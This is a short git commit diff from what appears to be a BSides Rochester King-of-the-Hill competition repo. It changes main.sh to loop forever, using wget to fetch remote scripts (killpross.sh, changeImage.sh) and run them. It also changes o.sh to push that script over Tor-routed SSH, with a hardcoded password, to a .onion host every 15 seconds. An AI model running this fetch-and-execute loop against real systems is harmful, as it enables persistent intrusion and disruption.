b612c3ef0e7b3e3cbabb27733a350d0d88169770
baa7968 <baa7968@rit.edu>
2018-04-13 23:06:37 -0400

    update

--- main.sh
+++ main.sh
@@ -1,8 +1,9 @@
 !#/bin/bash
-
-wget -O /tmp/one.sh https://raw.githubusercontent.com/bd3r/BsidesRochesterKOTH/master/killpross.sh
-wget -O /tmp/two.sh https://raw.githubusercontent.com/bd3r/BsidesRochesterKOTH/master/changeImage.sh
-sleep 1
-chmod +x /tmp/one.sh & chmod +x /tmp/two.sh
+while :
+do
+	wget -O /tmp/one.sh https://raw.githubusercontent.com/bd3r/BsidesRochesterKOTH/master/killpross.sh
+	wget -O /tmp/two.sh https://raw.githubusercontent.com/bd3r/BsidesRochesterKOTH/master/changeImage.sh
+	sleep 1
+	chmod +x /tmp/one.sh & chmod +x /tmp/two.sh
 	/tmp/one.sh & /tmp/two.sh 
-
+done
--- o.sh
+++ o.sh
@@ -2,7 +2,7 @@
 while :
 do
 	sshpass -p "koth" torify ssh koth@446oq64f55zaz4qu.onion 'bash -s' < /home/bdr/bsides/main.sh
-	sleep 900
+	sleep 15
 	exit
 done
 
